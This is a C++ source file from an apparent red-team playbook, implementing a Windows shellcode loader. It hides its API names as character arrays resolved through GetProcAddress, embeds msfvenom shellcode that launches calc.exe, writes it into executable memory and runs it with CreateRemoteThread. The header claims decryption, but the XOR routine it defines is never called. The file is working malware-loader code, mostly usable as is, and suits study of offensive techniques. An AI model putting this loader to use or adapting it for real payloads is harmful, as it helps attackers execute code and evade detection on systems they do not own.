/*
	Red Team Playbook - Shellcode decryption + CreateRemoteThread example
	Credits to all open-source authors out there
*/

#include <iostream>
#include <windows.h>

unsigned char sKernel32[] = { 'K','e','r','n','e','l','3','2',0x0 };

typedef LPVOID(WINAPI* _VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
unsigned char sVirtualAlloc[] = { 'V','i','r','t','u','a','l','A','l','l','o','c',0x0 };
_VirtualAlloc pVirtualAlloc = (_VirtualAlloc)(GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sVirtualAlloc));

typedef BOOL(WINAPI* _WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
unsigned char sWriteProcessMemory[] = { 'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y',0x0 };
_WriteProcessMemory pWriteProcessMemory = (_WriteProcessMemory)(GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sWriteProcessMemory));

typedef HANDLE(WINAPI* _CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
unsigned char sCreateRemoteThread[] = { 'C','r','e','a','t','e','R','e','m','o','t','e','T','h','r','e','a','d',0x0 };
_CreateRemoteThread pCreateRemoteThread = (_CreateRemoteThread)(GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sCreateRemoteThread));


// credit: Sektor7 RTO Malware Essential Course 
void XOR(unsigned char* data, size_t data_len, char* key, size_t key_len) {
	int j;

	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int main()
{
	// msfvenom -p windows/x64/exec CMD="calc.exe" -f c
	unsigned char buf[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
		"\x63\x2e\x65\x78\x65\x00";


	// VirtualAlloc on self 
	HANDLE hProc = GetCurrentProcess();
	LPVOID hAlloc = (LPVOID)pVirtualAlloc(NULL, sizeof(buf), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (hAlloc == NULL) {
		printf("[-] VirtualAlloc failed: %d\n", GetLastError());
		return 1;
	}

	// WriteProcessMemory on self 
	SIZE_T* lpNumberOfBytesWritten = 0;
	if (!pWriteProcessMemory(hProc, hAlloc, (LPVOID)buf, sizeof(buf), lpNumberOfBytesWritten)) {
		printf("[-] WPM failed: %d\n", GetLastError());
		return 1;
	}

	// CRT and execute the shellcode 
	DWORD threadId = 0;
	HANDLE hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)hAlloc, NULL, 0, (LPDWORD)(&threadId));
	if (hThread == NULL) {
		printf("[-] CRT failed: %d\n", GetLastError());
		return 1;
	}
	 
	// WaitForSingleObject 
	WaitForSingleObject(hThread, 1000);

	return 0;
}